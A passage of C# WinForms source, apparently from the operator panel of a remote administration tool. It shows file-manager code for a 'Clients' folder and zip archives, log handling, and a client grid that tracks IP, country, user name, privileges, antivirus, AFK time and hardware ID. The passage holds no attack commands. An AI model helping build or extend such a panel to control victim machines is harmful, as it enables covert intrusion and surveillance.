                gridView.Columns["Path"].Visible = false;
                gridView.Columns["IsDirectory"].Visible = false;
                gridView.Columns["IsZipEntry"].Visible = false;

                // Format columns
                gridView.Columns["Modified"].DisplayFormat.FormatType = DevExpress.Utils.FormatType.DateTime;
                gridView.Columns["Modified"].DisplayFormat.FormatString = "MM/dd/yyyy";

                // Double click handler to navigate
                gridView.DoubleClick += (s, args) => {
                    // Get mouse position from Control class
                    Point mousePoint = gridControl3.PointToClient(Control.MousePosition);
                    var hitInfo = gridView.CalcHitInfo(mousePoint);

                    if (hitInfo.InRow && hitInfo.RowHandle >= 0)
                    {
                        string name = gridView.GetRowCellValue(hitInfo.RowHandle, "Name").ToString();
                        string path = gridView.GetRowCellValue(hitInfo.RowHandle, "Path").ToString();
                        bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsDirectory"));
                        bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsZipEntry"));

                        if (name == "..")
                        {
                            NavigateBack();
                        }
                        else if (isDirectory && !isZipEntry)
                        {
                            NavigateToFolder(path);
                        }
                        else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                        {
                            NavigateToZipRoot(path);
                        }
                        else if (isDirectory && isZipEntry)
                        {
                            NavigateToZipFolder(currentZipFile, path);
                        }
                        else if (isZipEntry)
                        {
                            ExtractAndOpenFile(currentZipFile, path);
                        }
                        else
                        {
                            OpenFile(path);
                        }
                    }
                };

                // Add context menu
                gridView.PopupMenuShowing += (s, args) => {
                    if (args.HitInfo.InRow)
                    {
                        var menu = new DevExpress.XtraBars.PopupMenu();

                        // Add navigation commands
                        if (navigationHistory.Count > 0)
                        {
                            var backItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Back");
                            backItem.ItemClick += (sender, e) => NavigateBack();
                            menu.AddItem(backItem);
                        }

                        var refreshItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Refresh");
                        refreshItem.ItemClick += (sender, e) => {
                            if (insideZip)
                                NavigateToZipRoot(currentZipFile);
                            else
                                NavigateToFolder(currentPath);
                        };
                        menu.AddItem(refreshItem);

                        // If a row is selected, add item-specific commands
                        if (args.HitInfo.RowHandle >= 0)
                        {
                            string name = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Name").ToString();
                            string path = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Path").ToString();
                            bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsDirectory"));
                            bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsZipEntry"));

                            if (name != "..")
                            {
                                var openItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Open");
                                openItem.ItemClick += (sender, e) => {
                                    if (isDirectory && !isZipEntry)
                                        NavigateToFolder(path);
                                    else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                                        NavigateToZipRoot(path);
                                    else if (isDirectory && isZipEntry)
                                        NavigateToZipFolder(currentZipFile, path);
                                    else if (isZipEntry)
                                        ExtractAndOpenFile(currentZipFile, path);
                                    else
                                        OpenFile(path);
                                };
                                menu.AddItem(openItem);

                                if (isZipEntry && !isDirectory)
                                {
                                    var extractItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Extract");
                                    extractItem.ItemClick += (sender, e) => ExtractFile(currentZipFile, path);
                                    menu.AddItem(extractItem);
                                }
                            }
                        }

                        menu.ShowPopup(Control.MousePosition);
                    }
                };
            }

            fileManagerInitialized = true;
        }

        private void SetMainWindowCaption(string caption)
        {
            if (caption == null) caption = string.Empty;
            // Keep the window title on the native Text property. Avoid DevExpress
            // HTML caption layout so maximize/restore cannot reflow the title through
            // a second text engine.
            this.Text = caption;
            this.HtmlText = string.Empty;
        }

        private void NavigateToFolder(string folderPath)
        {
            try
            {
                // Save current path to history if not empty
                if (!string.IsNullOrEmpty(currentPath))
                {
                    navigationHistory.Push(currentPath);
                }

                // Update current path
                currentPath = folderPath;
                insideZip = false;
                currentZipFile = string.Empty;

                // Update window title to show current path
                SetMainWindowCaption($"File Manager - {folderPath}");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry if not at the root Clients folder
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!string.Equals(folderPath, clientsFolder, StringComparison.OrdinalIgnoreCase))
                {
                    DataRow backRow = fileTable.NewRow();
                    backRow["Name"] = "..";
                    backRow["Type"] = "Directory";
                    backRow["Size"] = "";
                    backRow["Modified"] = DateTime.Now;
                    backRow["Path"] = Directory.GetParent(folderPath).FullName;
                    backRow["IsDirectory"] = true;
                    backRow["IsZipEntry"] = false;
                    fileTable.Rows.Add(backRow);
                }

                // Add directories
                foreach (string directory in Directory.GetDirectories(folderPath))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(directory);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = dirInfo.Name;
                    row["Type"] = "Directory";
                    row["Size"] = "";
                    row["Modified"] = dirInfo.LastWriteTime;
                    row["Path"] = directory;
                    row["IsDirectory"] = true;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Add files
                foreach (string file in Directory.GetFiles(folderPath))
                {
                    FileInfo fileInfo = new FileInfo(file);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = fileInfo.Name;
                    row["Type"] = fileInfo.Extension.ToUpper().TrimStart('.');
                    row["Size"] = FormatAllASS(fileInfo.Length);
                    row["Modified"] = fileInfo.LastWriteTime;
                    row["Path"] = file;
                    row["IsDirectory"] = false;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipRoot(string zipFilePath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = zipFilePath;
                currentZipFile = zipFilePath;
                insideZip = true;

                // Update window title
                SetMainWindowCaption($"File Manager - {zipFilePath} (ZIP)");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;
                backRow["Path"] = Path.GetDirectoryName(zipFilePath);
                backRow["IsDirectory"] = true;
                backRow["IsZipEntry"] = false;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    // Get unique directories at the root level
                    HashSet<string> rootDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        // Check if this is a file or directory at the root level
                        if (entryPath.Contains("/"))
                        {
                            // It's a file in a subdirectory or a subdirectory itself
                            string[] parts = entryPath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                            if (parts.Length > 0)
                            {
                                rootDirs.Add(parts[0]);
                            }
                        }
                        else if (!string.IsNullOrEmpty(entryPath))
                        {
                            // It's a file at the root level
                            DataRow row = fileTable.NewRow();
                            row["Name"] = entry.Name;
                            row["Type"] = Path.GetExtension(entry.Name).ToUpper().TrimStart('.');
                            row["Size"] = FormatAllASS(entry.Length);
                            row["Modified"] = entry.LastWriteTime.DateTime;
                            row["Path"] = entry.FullName;
                            row["IsDirectory"] = false;
                            row["IsZipEntry"] = true;
                            fileTable.Rows.Add(row);
                        }
                    }

                    // Add all unique root directories
                    foreach (string dir in rootDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipFolder(string zipFilePath, string folderPath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = folderPath;
                insideZip = true;

                // Update window title
                SetMainWindowCaption($"File Manager - {zipFilePath} → {folderPath}");

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;

                // Determine parent path
                folderPath = folderPath.Replace('\\', '/');
                if (folderPath.Contains("/"))
                {
                    string parentPath = Path.GetDirectoryName(folderPath)?.Replace('\\', '/');
                    if (string.IsNullOrEmpty(parentPath))
                    {
                        backRow["Path"] = zipFilePath; // Back to ZIP root
                        backRow["IsZipEntry"] = false;
                    }
                    else
                    {
                        backRow["Path"] = parentPath;
                        backRow["IsZipEntry"] = true;
                    }
                }
                else
                {
                    backRow["Path"] = zipFilePath; // Back to ZIP root
                    backRow["IsZipEntry"] = false;
                }

                backRow["IsDirectory"] = true;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents of the folder
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    string folderPrefix = folderPath + "/";
                    HashSet<string> subDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        if (entryPath.StartsWith(folderPrefix, StringComparison.OrdinalIgnoreCase))
                        {
                            string relativePath = entryPath.Substring(folderPrefix.Length);

                            if (string.IsNullOrEmpty(relativePath))
                            {
                                // This is the folder entry itself, skip it
                                continue;
                            }

                            if (relativePath.Contains("/"))
                            {
                                // This is a file in a subdirectory or a subdirectory
                                string[] parts = relativePath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                                if (parts.Length > 0)
                                {
                                    subDirs.Add(parts[0]);
                                }
                            }
                            else
                            {
                                // This is a file in the current directory
                                DataRow row = fileTable.NewRow();
                                row["Name"] = relativePath;
                                row["Type"] = Path.GetExtension(relativePath).ToUpper().TrimStart('.');
                                row["Size"] = FormatAllASS(entry.Length);
                                row["Modified"] = entry.LastWriteTime.DateTime;
                                row["Path"] = entry.FullName;
                                row["IsDirectory"] = false;
                                row["IsZipEntry"] = true;
                                fileTable.Rows.Add(row);
                            }
                        }
                    }

                    // Add subdirectories
                    foreach (string dir in subDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = folderPrefix + dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateBack()
        {
            try
            {
                if (navigationHistory.Count > 0)
                {
                    string previousPath = navigationHistory.Pop();

                    if (previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !insideZip)
                    {
                        NavigateToZipRoot(previousPath);
                    }
                    else if (insideZip && !previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
                    {
                        // Going from inside a ZIP to a regular folder
                        NavigateToFolder(previousPath);
                    }
                    else if (insideZip)
                    {
                        // We're inside a ZIP folder, going to parent folder in the ZIP
                        NavigateToZipFolder(currentZipFile, previousPath);
                    }
                    else
                    {
                        // Regular folder navigation
                        NavigateToFolder(previousPath);
                    }
                }
                else if (insideZip)
                {
                    // If we're inside a ZIP but history is empty, go to the ZIP's containing folder
                    string zipFolder = Path.GetDirectoryName(currentZipFile);
                    if (!string.IsNullOrEmpty(zipFolder))
                    {
                        NavigateToFolder(zipFolder);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating back: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractAndOpenFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Create a temporary directory
                string tempDir = Path.Combine(Path.GetTempPath(), "Valhalla_FileManager");
                Directory.CreateDirectory(tempDir);

                // Create a unique filename for extraction
                string fileName = Path.GetFileName(entryPath);
                string targetPath = Path.Combine(tempDir, fileName);

                // If the file already exists, use a unique name
                if (File.Exists(targetPath))
                {
                    targetPath = Path.Combine(tempDir, $"{Path.GetFileNameWithoutExtension(fileName)}_{DateTime.Now.Ticks}{Path.GetExtension(fileName)}");
                }

                // Extract the file
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    ZipArchiveEntry entry = archive.GetEntry(entryPath);
                    if (entry != null)
                    {
                        entry.ExtractToFile(targetPath, true);

                        // Open the file
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = targetPath,
                            UseShellExecute = true
                        });
                    }
                    else
                    {
                        MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting and opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Ask the user for a save location
                SaveFileDialog saveDialog = new SaveFileDialog
                {
                    FileName = Path.GetFileName(entryPath),
                    Filter = "All Files (*.*)|*.*"
                };

                if (saveDialog.ShowDialog() == DialogResult.OK)
                {
                    using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(entryPath);
                        if (entry != null)
                        {
                            entry.ExtractToFile(saveDialog.FileName, true);
                            MessageBox.Show($"File extracted to: {saveDialog.FileName}", "Extraction Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void OpenFile(string filePath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string FormatAllASS(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }



        private void ShowProperties(string path, bool isZipEntry)
        {
            try
            {
                // Create a simple properties dialog
                Form propertiesForm = new Form
                {
                    Text = "File Properties",
                    Size = new Size(400, 300),
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    StartPosition = FormStartPosition.CenterParent,
                    MaximizeBox = false,
                    MinimizeBox = false
                };

                // Create a TableLayoutPanel for the properties
                TableLayoutPanel panel = new TableLayoutPanel
                {
                    Dock = DockStyle.Fill,
                    Padding = new Padding(10),
                    RowCount = 6,
                    ColumnCount = 2,
                    ColumnStyles = {
                new ColumnStyle(SizeType.Percent, 30F),
                new ColumnStyle(SizeType.Percent, 70F)
            }
                };

                // Add properties
                panel.Controls.Add(new Label { Text = "Name:", Dock = DockStyle.Fill }, 0, 0);
                panel.Controls.Add(new Label { Text = Path.GetFileName(path), Dock = DockStyle.Fill }, 1, 0);

                panel.Controls.Add(new Label { Text = "Location:", Dock = DockStyle.Fill }, 0, 1);
                panel.Controls.Add(new Label { Text = isZipEntry ? currentZipFile : Path.GetDirectoryName(path), Dock = DockStyle.Fill }, 1, 1);

                if (isZipEntry)
                {
                    // Show ZIP entry properties
                    using (ZipArchive archive = ZipFile.OpenRead(currentZipFile))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(path);
                        if (entry != null)
                        {
                            panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.Length), Dock = DockStyle.Fill }, 1, 2);

                            panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 3);
                            panel.Controls.Add(new Label { Text = entry.LastWriteTime.DateTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                            panel.Controls.Add(new Label { Text = "Compressed Size:", Dock = DockStyle.Fill }, 0, 4);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.CompressedLength), Dock = DockStyle.Fill }, 1, 4);

                            panel.Controls.Add(new Label { Text = "Compression Ratio:", Dock = DockStyle.Fill }, 0, 5);
                            panel.Controls.Add(new Label { Text = entry.Length > 0 ? $"{(1 - (double)entry.CompressedLength / entry.Length) * 100:F1}%" : "0%", Dock = DockStyle.Fill }, 1, 5);
                        }
                    }
                }
                else
                {
                    // Show file system properties
                    if (File.Exists(path))
                    {
                        FileInfo fileInfo = new FileInfo(path);

                        panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = FormatFileSize(fileInfo.Length), Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = fileInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = fileInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = fileInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                    else if (Directory.Exists(path))
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(path);

                        panel.Controls.Add(new Label { Text = "Type:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = "Directory", Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = dirInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = dirInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = dirInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                }

                propertiesForm.Controls.Add(panel);

                // Add OK button
                Button okButton = new Button
                {
                    Text = "OK",
                    DialogResult = DialogResult.OK,
                    Anchor = AnchorStyles.Bottom | AnchorStyles.Right,
                    Location = new Point(propertiesForm.ClientSize.Width - 85, propertiesForm.ClientSize.Height - 40),
                    Size = new Size(75, 25)
                };
                propertiesForm.Controls.Add(okButton);
                propertiesForm.AcceptButton = okButton;

                // Show the form
                propertiesForm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error showing properties: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdatePathLabel(string path)
        {
            // Find the path label in the toolbar
            foreach (Control control in gridControl3.Parent.Controls)
            {
                if (control is Panel panel)
                {
                    foreach (Control panelControl in panel.Controls)
                    {
                        if (panelControl is Label label && label.BorderStyle == BorderStyle.FixedSingle)
                        {
                            label.Text = path;
                            return;
                        }
                    }
                }
            }
        }

        private string FormatMyAss(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }


        private void InitializeLogging()
        {
            logUpdateTimer = new System.Windows.Forms.Timer();
            logUpdateTimer.Interval = 500;
            logUpdateTimer.Tick += ProcessLogQueue;
            logUpdateTimer.Start();
        }

        public void LogToMonitor(string message, LogType type)
        {
            logQueue.Enqueue(new LogEntry
            {
                Timestamp = DateTime.Now,
                Message = message,
                Type = type
            });

            if (logQueue.Count > maxLogEntries * 2)
            {
                LogEntry dummy;
                while (logQueue.Count > maxLogEntries && logQueue.TryDequeue(out dummy))
                {
                }
            }
        }

        private static readonly object serverErrorLogLock = new object();

        private void LogServerEvent(string message, LogType type)
        {
            LogToMonitor(message, type);

            if (type == LogType.Error)
            {
                try
                {
                    string errorLogPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error.log");
                    string line = "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") + "] " + (message ?? string.Empty);
                    lock (serverErrorLogLock)
                    {
                        File.AppendAllText(errorLogPath, line + Environment.NewLine, Encoding.UTF8);
                    }
                }
                catch
                {
                    // Logging must never interrupt the server path.
                }
            }
        }

        private void AppendServerSettingsLog(string message, LogType type)
        {
            if (richTextBox1 == null || IsDisposed || Disposing)
                return;

            if (InvokeRequired)
            {
                try
                {
                    if (!IsHandleCreated)
                        return;
                    BeginInvoke(new Action<string, LogType>(AppendServerSettingsLog), message, type);
                }
                catch (ObjectDisposedException) { }
                catch (InvalidOperationException) { }
                return;
            }

            try
            {
                if (!richTextBox1.IsHandleCreated || richTextBox1.IsDisposed || richTextBox1.Disposing)
                    return;

                string formatted = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + message + Environment.NewLine;
                int startIndex = richTextBox1.TextLength;
                richTextBox1.AppendText(formatted);
                richTextBox1.Select(startIndex, formatted.Length);
                richTextBox1.SelectionColor = type == LogType.Error ? Color.FromArgb(235, 78, 78) :
                    (type == LogType.Warning ? Color.FromArgb(235, 196, 78) : Color.White);
                richTextBox1.SelectionLength = 0;
                richTextBox1.SelectionStart = richTextBox1.TextLength;
                richTextBox1.ScrollToCaret();
            }
            catch (ObjectDisposedException) { }
            catch (InvalidOperationException) { }
            catch (System.ComponentModel.Win32Exception) { }
        }

        private void ProcessLogQueue(object sender, EventArgs e)
        {
            if (logQueue.IsEmpty || serverLogsGrid == null)
                return;

            int processCount = Math.Min(100, logQueue.Count);
            if (processCount == 0)
                return;

            bool wasAtBottom = IsServerLogsScrolledToBottom();
            serverLogsGrid.SuspendLayout();
            for (int i = 0; i < processCount; i++)
            {
                LogEntry entry;
                if (!logQueue.TryDequeue(out entry))
                    break;

                int rowIndex = serverLogsGrid.Rows.Add(
                    "[" + entry.Timestamp.ToString("HH:mm:ss.fff") + "] " + entry.Message,
                    GetLogStatusText(entry.Type));
                DataGridViewRow row = serverLogsGrid.Rows[rowIndex];
                Color color = entry.GetColor();
                row.Cells[0].Style.ForeColor = color;
                row.Cells[1].Style.ForeColor = color;
            }

            while (serverLogsGrid.Rows.Count > maxLogEntries)
                serverLogsGrid.Rows.RemoveAt(0);

            if (wasAtBottom && autoScroll && serverLogsGrid.Rows.Count > 0)
                serverLogsGrid.FirstDisplayedScrollingRowIndex = serverLogsGrid.Rows.Count - 1;
            serverLogsGrid.ClearSelection();
            serverLogsGrid.ResumeLayout();
        }

        private static string GetLogStatusText(LogType type)
        {
            switch (type)
            {
                case LogType.Success:
                case LogType.Connection:
                    return "Success";
                case LogType.Warning:
                case LogType.Security:
                    return "Warning";
                case LogType.Error:
                    return "Error";
                default:
                    return "Info";
            }
        }

        private bool IsServerLogsScrolledToBottom()
        {
            if (serverLogsGrid == null || serverLogsGrid.Rows.Count == 0)
                return true;
            return serverLogsGrid.FirstDisplayedScrollingRowIndex + serverLogsGrid.DisplayedRowCount(false) >= serverLogsGrid.Rows.Count - 1;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Register cleanup handler.
            this.FormClosing += (s, args) => CleanupResourceMonitor();

            // Keep the window inside the monitor working area so it never extends
            // underneath the Windows taskbar on shorter displays.
            FitFormToWorkingArea();
        }

        private void FitFormToWorkingArea()
        {
            if (WindowState == FormWindowState.Maximized)
                return;

            Screen screen = Screen.FromControl(this);
            Rectangle workingArea = screen.WorkingArea;

            int width = Math.Min(Width, workingArea.Width);
            int height = Math.Min(Height, workingArea.Height);

            if (width == Width && height == Height &&
                Bounds.Left >= workingArea.Left &&
                Bounds.Top >= workingArea.Top &&
                Bounds.Right <= workingArea.Right &&
                Bounds.Bottom <= workingArea.Bottom)
            {
                return;
            }

            Size = new Size(width, height);
            Left = Math.Max(workingArea.Left, Math.Min(Left, workingArea.Right - width));
            Top = Math.Max(workingArea.Top, Math.Min(Top, workingArea.Bottom - height));
        }

        private void SetupGridControl()
        {
            clientsTable = new DataTable("Clients");
            clientsTable.Columns.Add("IP", typeof(string));
            clientsTable.Columns.Add("Country", typeof(string));
            clientsTable.Columns.Add("Nickname", typeof(string));
            clientsTable.Columns.Add("Tag", typeof(string));
            clientsTable.Columns.Add("UserName", typeof(string));
            clientsTable.Columns.Add("Version", typeof(string));
            clientsTable.Columns.Add("Privileges", typeof(string));
            clientsTable.Columns.Add("OS", typeof(string));
            clientsTable.Columns.Add("GPU", typeof(string));
            clientsTable.Columns.Add("CPU", typeof(string));
            clientsTable.Columns.Add("RAM", typeof(string));
            clientsTable.Columns.Add("AntiVirus", typeof(string));
            clientsTable.Columns.Add("Uptime", typeof(string));
            clientsTable.Columns.Add("AFKTime", typeof(string));
            clientsTable.Columns.Add("Ping", typeof(string));
            clientsTable.Columns.Add("HWID", typeof(string));
            clientsTable.Columns.Add("Fingerprint", typeof(string));
            clientsTable.Columns.Add("ConnectionId", typeof(string));

            gridControl1.DataSource = clientsTable;
            gridView = gridControl1.MainView as GridView;

            if (gridView == null)
                return;

            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsSelection.EnableAppearanceFocusedCell = false;
            gridView.OptionsSelection.EnableAppearanceFocusedRow = true;
            gridView.OptionsSelection.MultiSelect = true;
            gridView.OptionsSelection.MultiSelectMode = DevExpress.XtraGrid.Views.Grid.GridMultiSelectMode.RowSelect;
            gridView.FocusRectStyle = DevExpress.XtraGrid.Views.Grid.DrawFocusRectStyle.RowFocus;
            gridView.OptionsView.ColumnAutoWidth = false;
            gridView.OptionsView.ShowGroupPanel = false;

            // Keep horizontal scrolling available at all times. DevExpress documents
            // ColumnAutoWidth=false + HorzScrollVisibility=Always for this behavior.
            // The application globally uses ScrollUIMode.Desktop, so the stock DevExpress
            // scrollbar remains visible without a custom paint hook.
            // Both axes are forced to Always so the scroll thumb is permanently painted,
            // not just on mouse-over. This also ensures the bottom scrollbar stays visible
            // regardless of which DevExpress skin is active.
            gridView.HorzScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Always;
            gridView.VertScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Auto;
            gridControl1.UseEmbeddedNavigator = false;

            // Search is hosted in the dedicated toolbar field below instead of the
            // grid's embedded Find Panel. This keeps the column-header row in the
            // grid layout and prevents the search surface from covering the first
            // columns. The standalone SearchControl uses the documented GridControl
            // search client API.
            gridView.OptionsFind.AllowFindPanel = false;
            gridView.OptionsFind.FindFilterColumns = "*";
            gridView.OptionsFind.Condition = DevExpress.Data.Filtering.FilterCondition.Contains;
            gridView.OptionsFind.Behavior = DevExpress.XtraEditors.FindPanelBehavior.Filter;
            gridView.OptionsFind.FindMode = DevExpress.XtraEditors.FindMode.Always;

            gridView.Columns["IP"].Caption = "IP Address";
            gridView.Columns["Country"].Caption = "Country";
            gridView.Columns["Nickname"].Caption = "Nickname";
            gridView.Columns["Tag"].Caption = "Tag";
            gridView.Columns["UserName"].Caption = "User Name";
            gridView.Columns["Version"].Caption = "Version";
            gridView.Columns["Privileges"].Caption = "Privileges";
            gridView.Columns["OS"].Caption = "OS";
            gridView.Columns["GPU"].Caption = "GPU";
            gridView.Columns["CPU"].Caption = "CPU";
            gridView.Columns["RAM"].Caption = "RAM";
            gridView.Columns["AntiVirus"].Caption = "Anti Virus";
            gridView.Columns["Uptime"].Caption = "Uptime";
            gridView.Columns["AFKTime"].Caption = "AFK Time";
            gridView.Columns["Ping"].Caption = "Ping";
            gridView.Columns["HWID"].Caption = "HWID";
            gridView.Columns["Fingerprint"].Caption = "Fingerprint";

            gridView.Columns["IP"].Width = 120;
            gridView.Columns["Country"].Width = 100;
            gridView.Columns["Nickname"].Width = 140;
            gridView.Columns["Tag"].Width = 110;
            gridView.Columns["UserName"].Width = 130;
            gridView.Columns["Version"].Width = 125;
            gridView.Columns["Privileges"].Width = 110;
            gridView.Columns["OS"].Width = 150;
            gridView.Columns["GPU"].Width = 180;
            gridView.Columns["CPU"].Width = 170;
            gridView.Columns["RAM"].Width = 130;
            gridView.Columns["AntiVirus"].Width = 160;
            gridView.Columns["Uptime"].Width = 110;
            gridView.Columns["AFKTime"].Width = 110;
            gridView.Columns["Ping"].Width = 85;
            gridView.Columns["HWID"].Width = 170;
